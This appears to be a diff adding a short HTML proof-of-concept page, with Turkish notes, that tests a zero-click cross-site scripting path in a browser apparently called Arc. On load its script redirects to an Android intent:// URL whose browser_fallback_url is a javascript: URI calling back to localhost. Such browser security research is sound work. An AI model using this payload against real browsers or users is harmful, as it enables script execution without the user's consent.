@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Arc PoC v9 - Zero Click Test</title></head>
+<body style="padding:20px;font-size:16px;background:white;">
+<h2>PoC v9 — Zero-Click Test</h2>
+<p id="s" style="color:green;font-weight:bold;">Loaded OK</p>
+<p style="font-size:12px;">
+  Page load'da otomatik window.location ile intent trigger.<br>
+  Eğer dialog link tap olmadan çıkarsa = 1 user interaction (sadece Deny).
+</p>
+<script>
+  document.getElementById('s').innerText = 'Loaded: ' + location.href;
+  // Auto-trigger intent URL on page load — no link tap needed
+  setTimeout(function() {
+    window.location = "intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:location='http://localhost:8080/xss_callback?src=zeroclick';end";
+  }, 1500);
+</script>
+</body>
+</html>
